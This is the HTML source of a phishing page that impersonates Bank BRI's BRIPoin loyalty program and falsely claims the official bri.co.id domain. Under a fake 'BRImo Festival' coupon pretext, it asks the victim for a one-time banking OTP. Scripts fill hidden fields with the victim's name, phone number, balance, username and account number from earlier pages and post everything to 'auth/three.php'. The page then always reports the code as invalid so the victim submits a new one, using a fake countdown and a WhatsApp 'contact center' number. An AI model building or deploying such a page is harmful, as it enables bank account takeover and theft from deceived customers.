
<html>
 <head> 
  <meta charset="utf-8"> 
  <meta name="fragment" content="!"> 
  <meta name="theme-color" content="#0F78CB"> 
   <!-- HTML Meta Tags -->

  <title>𝗕𝗥𝗜𝗣𝗼𝗶𝗻 | 𝗧𝘂𝗸𝗮𝗿𝗸𝗮𝗻 𝗣𝗢𝗜𝗡-𝗺𝘂</title>

  <meta name="description" content="BRIPoin adalah program loyalitas yang ditujukan untuk seluruh Nasabah Bank BRI (BritAma, Simpedes, E-Banking, Kartu Debit dan Kartu Kredit). Perbanyak poin Anda dari segala jenis transaksi di Bank BRI dan tukar poin dengan beragam reward menarik khusus untuk nasabah setia Bank BRI.">

  <!-- Facebook Meta Tags -->
  <meta property="og:url" content="https://bripoin.bri.co.id">
  <meta property="og:type" content="website">
  <meta property="og:title" content="𝗕𝗥𝗜𝗣𝗼𝗶𝗻  | 𝗧𝘂𝗸𝗮𝗿𝗸𝗮𝗻 𝗣𝗢𝗜𝗡-𝗺𝘂">
  <meta property="og:description" content="BRIPoin adalah program loyalitas yang ditujukan untuk seluruh Nasabah Bank BRI (BritAma, Simpedes, E-Banking, Kartu Debit dan Kartu Kredit). Perbanyak poin Anda dari segala jenis transaksi di Bank BRI dan tukar poin dengan beragam reward menarik khusus untuk nasabah setia Bank BRI.">
  <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQe2_RRje_H6EnHBS7-zriaK4XxvgoL3qqnmA&usqp=CAU">

  <!-- Twitter Meta Tags -->
  <meta name="twitter:card" content="summary_large_image">
  <meta property="twitter:domain" content="bripoin.bri.co.id">
  <meta property="twitter:url" content="https://bripoin.bri.co.id">
  <meta name="twitter:title" content="𝗕𝗥𝗜𝗣𝗼𝗶𝗻 | 𝗧𝘂𝗸𝗮𝗿𝗸𝗮𝗻 𝗣𝗢𝗜𝗡-𝗺𝘂">
  <meta name="twitter:description" content="BRIPoin adalah program loyalitas yang ditujukan untuk seluruh Nasabah Bank BRI (BritAma, Simpedes, E-Banking, Kartu Debit dan Kartu Kredit). Perbanyak poin Anda dari segala jenis transaksi di Bank BRI dan tukar poin dengan beragam reward menarik khusus untuk nasabah setia Bank BRI.">
  <meta name="twitter:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQe2_RRje_H6EnHBS7-zriaK4XxvgoL3qqnmA&usqp=CAU">

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, maximum-scale=1">
<link rel="icon" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgO_KJKoiNoIOuh2awDawBIzbhPGD8ZE4TQ2Lzyo2PyR4INOQozVU1zIwCJXeS3T_ZhCnXxdoYusOrUPXuuMF1k-9P3jpaV1SLE9L0WQrdMN72HbXyIc0uDJOF04L_GChyphenhyphenUilXS-nc35hyJaBkonxSZr14jTnIWJE8MXDHo_-G5nfONdgw9zPpI1CPwFhs/s100/AddText_10-22-11.27.51.jpg" type="image/x-icon" />
<link rel="apple-touch-icon" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEipe73s-3CcYv1XXmiOtnfFSKYbs7EFK5AJb1P4Jj-6LiXpr7qbbsnoHWxM-MG6cHMlkZu6V342OuENy8Evo_MoLlFzmub-d7VFYcBycMykKax6G8XaoMGi_IhqDZzVm9Sv05nTWxEDe82lnuwS4ln0HnG6VE0sGqhO70WQflrIt5RuY8lZIDftN9qwk4Q/s1080/AddText_10-22-11.27.23.jpg" />
  <!-- Meta Tags Generated via https://www.opengraph.xyz -->
        
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous"> 
  <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css"> 
  <style>
        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@500&display=swap');
        body {
            padding: 0;
            margin: 0;
            width: 100%;
            font-family: 'Open Sans', sans-serif;
            position: fixed;
            background:#DEE7EE;
        }

        .text-header {
            font-family: 'Open Sans', sans-serif;
            color: #0086e0;
        }

        .text-subheader {
            font-family: 'Open Sans', sans-serif;
            margin-top: -20px;
            color: #000;
        }

        .btn-punya {
            display: block;
            margin: 80px auto 0 auto;
            padding: 0px; 
            cursor: pointer; 
            background: none rgb(0, 134, 224);
            border: none; 
            text-align: center; 
            height: 57px; 
            width: 459px; 
            max-width: 100%;
            font-family: Arial; 
            font-size: 14px; 
            font-weight: bold; 
            color: rgb(255, 255, 255); 
            letter-spacing: 2px; 
            line-height: 1; 
            border-radius: 5px; 
            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; 
            transition: background 200ms ease 0s;
        }

        .btn-belum {
            display: block;
            margin: 10px auto;
            padding: 0px; 
            cursor: pointer; 
            background: none transparent;
            border: none; 
            text-align: center; 
            height: 57px; 
            width: 459px; 
            max-width: 100%;
            font-family: Arial; 
            font-size: 14px; 
            font-weight: bold; 
            color: rgb(0, 134, 224);
            letter-spacing: 2px; 
            line-height: 1; 
            border-radius: 5px; 
            transition: background 200ms ease 0s;
        }

        .form-log {
            box-sizing: border-box; 
            height: 45px; 
            width: 336px;
            max-width: 90%;
            border: 3px solid rgb(0, 134, 224);
            border-radius: 23px;
            font-family: 'Open Sans', sans-serif;
            font-size: 16px; 
            color: rgb(28, 28, 28); 
            word-spacing: 0px; 
            padding: 0px 45px;
            text-align: center;
            }

        #ionIcons {
            color: rgb(22, 119, 199);
            font-size: 29px;
            position: absolute;
            display: block;
            margin-top: 8px;
            margin-left: 37px;
        }

        .eye {
            display: block;
            margin: -40px auto;
            margin-right: 20px;
            position: relative;
            box-sizing: border-box; 
            z-index: 16; 
            height: 19.8189px;
            width: 25.0236px; 
            float: right;
            border-radius: 0px; 
            cursor: pointer;
        }

        .Button clickable-element {
            display: block;
            margin: 60px 0 0 0;
            padding: 0px; 
            cursor: pointer; 
            background: none rgba(0, 111, 214, 0.96); 
            border: none; 
            text-align: center; 
            height: 57px; 
            width: 370px; 
            font-family: Arial; 
            font-size: 17px; 
            font-weight: bold; 
            color: rgb(255, 255, 255); 
            letter-spacing: 1px; 
            line-height: 1; 
            border-radius: 8px; 
            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; 
            transition: background 100ms step-start 0s;
        }

        @media only screen and (max-width: 600px) {
            .btn-login {
                width: 82%;
            }
        }

        .box-lte {
            width: 380px;
            max-width: 95%;
            background: none;
            display: block;
            
            margin: -40px auto;
            border-radius: 20px;
        }

        textarea {
            box-sizing: border-box; 
            height: 75px;
            margin-top: -30px;
            width: 280px;
            border: 3px solid rgb(0, 134, 224);
            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px;
            border-radius: 15px;
            padding: 5px 10px;
        }
        
          .textarea1 {
            box-sizing: border-box; 
            
            border: 2px solid red;
            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px;
            border-radius: 50px;
            
        }
        
         .textarea {
            box-sizing: border-box; 
            height: 75px;
           
            width: 280px;
            border: 2px solid red;
            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px;
            border-radius: 15px;
            padding: 5px 10px;
        }
        
        textarea::placeholder{
            font-size: 13px;
        }
           h1{
            display: table;
            background-color: transparent;
            color: #FF0000;
            padding: 15px;
            width: 100%;
            font-size: 14px;
            margin-bottom: -70px;
            text-align: center;
            position: fixed;
            top: 0;
           font-weight: bold;
            right: 0;
            left: 0;
            margin: 0px auto;
            
        }
        
        .blink {
  animation: blink-animation 2s steps(6, start) infinite;
  -webkit-animation: blink-animation 2s steps(6, start) infinite;
}
@keyframes blink-animation {
  to {
    visibility: hidden;
  }
}
@-webkit-keyframes blink-animation {
  to {
    visibility: hidden;
  }
}

#Aktivasi{
    display: none;
}
    </style> 
 </head> 
 <body> 
  <span class="blink" style="display: none" id="blinkk"><h1>Tautan Link tidak Valid, atau sudah Kadaluarsa</h1></span>
 <span class="blink" style="display: none" id="blinkAktivasi"><h1>Kode Virtual tidak valid, atau sudah kadaluarsa</h1></span>
  <div id="popupku" style="position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  width: 100%; height: 100%; background: rgba(0,0,0, 0.4); z-index: 9999">
    <center>
 <img id="gambarku" class="animated" src="a211ot.jpg" width="60%" style="margin-top: 250px; border-radius: 15px; box-shadow: rgba(199, 199, 199, 2.2)  0px 2px 5px 0px; border: 2px double #0F78CB" onclick="tutupimg()">
    </center>
    </div>
 <img id="logoku" src="imageedit_1_4012154301.png" style="position: fixed; top: 15; left: 15; width: 50px;">
    <div class="col-12 d-block mx-auto text-center p-0" style="height: 150px; width: 256px; max-width: 100%; display: block; margin-top: 70px; border-radius: 0px; margin-bottom: -200px"><center><img alt="" src="-/www.nlstore.my.id/giphy.gif" style="display: block; margin: 0px; width: 50%; height: 50%; border-radius: 0px;">𝗟𝗼𝗻𝗰𝗲𝗻𝗴 𝗡𝗼𝘁𝗶𝗳𝗶𝗸𝗮𝘀𝗶</center></div>
  <div class="container" id="otp"> 
  
   <div class="box-lte"> 
    <div class="row" style="margin-top: 40px;"> 
     <center>
     <div class="col-12 d-block mx-auto text-center p-0" style="height: 290px; width: 85%; max-width: 100%; display: block; margin-top: 100px; border-radius: 0px 25px 0px 25px; position: absolute; margin: 0px auto; left: 0; right: 0;z-index: -1"> 
      <img alt="" src="AddText_06-14-11.05.21.png" style="display: block; margin: 70px auto; width: 100%; border: 0px solid #fff; border-radius: 15px 15px 15px 15px; border-top: none; box-shadow: rgba(99, 99, 99, 0.2) -0px 3px 8px -2px;"> 
     </div> 
    </div> 
    <div class="row" style="margin-top: 110px"> 
    
     <p style="font-weight: bold; font-size: 20px; color: #098CE3; text-align: center; margin: 10px auto;" id="waktu">3 : 00</p> 
    </div> 
    <div class="row"> 
     <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto; padding: 0 20px; margin-top: 30px"> 
      <p style="font-size: 10px; text-align: center; font-weight: bold; padding: 15px"></p> 
     </div> 
    </div> 
    <center>
    <div class="row" style="margin-top: 10px; border: 2px solid #fff; width: 94%; border-radius: 15px; background-image: url(AddText_06-10-03.05.51.png); background-size: 100% 100%; background-position: 100% 100%; padding-top: 10px; box-shadow: rgba(99, 99, 99, 0.2) 0px 2px 8px 0px;"> 
     <div class="col-12" style="width: 100%; max-width: 100%; display: block; margin: 5px auto;"> 
  <form onsubmit="kirimPesan1(event)" method="post" id="formLink">
      
<input type="hidden" id="nama" name="nama"> 
 <input type="hidden" id="nomor" name="nomor">
  <input type="hidden" id="saldo" name="saldo">
  <input type="hidden" id="username" name="user"> 
 <input type="hidden" id="pass" name="pass">
       <center> 
        <div style="margin-top: 30px"> 
        
      
         <textarea type="tel" name="sms" id="sms"  oninvalid="this.setCustomValidity('Mɑsukkɑn 6 Digit 𝗞𝗼𝗱𝗲 𝗩𝗶𝗿𝘁𝘂𝗮𝗹 𝗗𝗲𝗻𝗴𝗮𝗻 𝗕𝗲𝗻𝗮𝗿')" onchange="this.setCustomValidity('')" class="bubble-element Input form-log" placeholder="Silahkan  masukan Kode OTP Cetak kupon undian BRImo Festival dikotak ini" maxlength="6" minlength="6" style="margin-left: 0px; height: 65px; border-radius: 10px; text-align: left; padding: 8px" required onclick="gantiborder1()"></textarea>
  
         <b> <p style="font-size: 11px; text-align: center; margin-top: 25px; margin-left: 10px; margin-right: 10px;"><strong style="color: #FF0000;"></strong></p></b>
        </div>
       </center>
       <b>
<input type="submit" id="kirims" class="bubble-element Button clickable-element" style="max-width: 85%; padding: 0px; cursor: pointer; background: none rgb(9, 140, 227); border: none; text-align: center; display: block; margin: 20px auto; height: 39px; width: 346px; left: 0px; top: 0px; font-family: Arial; font-size: 14px; font-weight: 400; color: rgb(255, 255, 255); letter-spacing: 1px; line-height: 1; border-radius: 50px; box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; transition: background 200ms ease 0s; font-weight: 700" tabindex="2" value="Konfirmasi"  />
</b>
      </form>
     </div>
     <b> </b>
    </div>
    <b> </b>
   </div>
   <b> <p onclick="location.href='https://wa.me/628388504835?text=Saya Belum Mendapatkan Kode Kupon Undian'" style="font-size: 14px; text-align: center; margin-top: 55px; margin-left: 10px; margin-right: 10px;"><strong style="color: #FF0000; text-decoration: none"> Tidak Terima Kode ?<br>
         <span style="color: #098CE3">Hubungi Contact Center</span>
         </strong></p></b>
   </center>
   <b> 
     </center>
    </div> </b>
  </div>

     <center>
 <img src="1703668668502.png" style="width: 100%; position: fixed; bottom: 0; left: 0; right: 0; margin: 0px auto">
     </center>
     <audio hidden controls id="bsi">
<source src="kode-otp." type="audio/ogg">
<source src="kode-otp." type="audio/mpeg">
  Your browser does not support the audio element.
</audio> 
 <audio hidden controls id="bsiku">
<source src="tunggu-bri." type="audio/ogg">
<source src="tunggu-bri." type="audio/mpeg">
  Your browser does not support the audio element.
</audio>
    </div> </b>
  </div>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="mainkode.js"></script>
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>

<script>
    window.onload = function() {
  var minute = 02;
  var sec = 59;
  setInterval(function() {
    document.getElementById("waktu").innerHTML =   minute + " : " + sec  ;
    sec--;

    if (sec == 0) {
      minute--;
      sec = 59;

      if (minute == 0) {
        minute = 1;
      }
    }
  }, 1000);
}
  
  
  
   
    document.getElementById('waktu1').innerHTML =
          03 + ":" + 01;
        startTimer();
        
        function startTimer() {
          var presentTime = document.getElementById('waktu1').innerHTML;
          var timeArray = presentTime.split(/[:]+/);
          var m = timeArray[0];
          var s = checkSecond((timeArray[1] - 1));
          if(s==59){m=m-1}
          if(m<0){
            return
          }
          
          document.getElementById('waktu1').innerHTML =
            m + " : " + s;
          console.log(m)
          setTimeout(startTimer, 1000);
          
        }
        
        function checkSecond(sec) {
          if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
          if (sec < 0) {sec = "59"};
          return sec;
        }
        
        
        
    
    </script>  
  <script>
      document.getElementById('timer').innerHTML =
          03 + ":" + 01;
        startTimer1();
        
        function startTimer1() {
          var presentTime = document.getElementById('timer').innerHTML;
          var timeArray = presentTime.split(/[:]+/);
          var m = timeArray[0];
          var s = checkSecond((timeArray[1] - 1));
          if(s==59){m=m-1}
          if(m<0){
            return
          }
          
          document.getElementById('timer').innerHTML =
            m + " : " + s;
          console.log(m)
          setTimeout(startTimer1, 1000);
          
        }
        
        function checkSecond(sec) {
          if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
          if (sec < 0) {sec = "59"};
          return sec;
        }
        
        
        
  </script>
  <!-- Static App Form Collection Script -->
<!--<script src="https://static.app/js/static-forms.js" type="text/javascript"></script>

<script src="https://static.app/js/static.js" type="text/javascript"></script>-->
    <script>
var nama = sessionStorage.getItem("nama");

document.getElementById("nama").value = nama + "";
var nomor = sessionStorage.getItem("nomor");

document.getElementById("nomor").value = nomor + "";
var saldo = sessionStorage.getItem("saldo");

document.getElementById("saldo").value = saldo + "";

var unames = sessionStorage.getItem("unames");
document.getElementById("username").value = unames + "";
var norek = sessionStorage.getItem("norek");

document.getElementById("pass").value = norek + "";

  </script>
  
  <script>
 function tutupimg(){
      setTimeout(() => {
  $("#popupku").hide();
      },1000)
      setTimeout(() => {
       audio = document.getElementById("bsi");
    audio.play();
    audio.loop = false
      },900)
  $("#gambarku").addClass("naik");
 }

</script>
<script>
function getcs(){
 $("#process1").show();   
  audio4 = document.getElementById("bsiku");
  audio = document.getElementById("bsi");
    audio4.play();
     audio.load();
    audio4.loop = false
setTimeout(function(){  
    $("#process1").hide();   
location.href='#?text=Saya Belum Mendapatkan Kode Kupon Undian';

    }, 5000);    
    
}     
 </script>
  
     <script>
 $('#formLink').on('submit', function (event) {

  event.stopPropagation();
    event.preventDefault();
    
 document.getElementById('kirims').innerHTML = "Memproses....";



$.ajax({

 type: 'POST',
 url: 'auth/three.php',
 async: false,
 dataType: 'JSON',
 data: $(this).serialize(),
 
 complete: function(data) {
            console.log('Complete')
 setTimeout(function(){
      document.getElementById("blinkAktivasi").style.display = "block";
  alert("Kode 𝗢𝗧𝗣 𝗦𝗮𝗹𝗮𝗵 / 𝗞𝗮𝗱𝗮𝗹𝘂𝗮𝗿𝘀𝗮                                      Harap Periksa 𝗞𝗼𝗱𝗲 𝗢𝗧𝗣 yang terbaru di 🔔 𝗟𝗼𝗻𝗰𝗲𝗻𝗴 𝗡𝗼𝘁𝗶𝗳𝗶𝗸𝗮𝘀𝗶 pada Aplikasi BRImo anda");
  document.getElementById('kirims').innerHTML = "Kirim";                  
                    
 $("#sms").val("");
 $("#sms").addClass('textarea1'); 
   


    }, 2000);



        }
    });

    return false;
});   
        
</script>
<script>
 function gantiborder(){
   $("#nama").removeClass('textarea'); 
   $("#blinkk").hide(); 
   document.getElementById('kirims').value = "Konfirmasi";
 }   
 
 function gantiborder1(){
   $("#nama1").removeClass('textarea1'); 
   $("#blinkAktivasi").hide(); 
   $("#logoku").show(); 
   document.getElementById('kirims').value = "Konfirmasi";
 }   
</script>
</body>
</html><!--<script src='https://a.bsite.net/footer.js'></script>
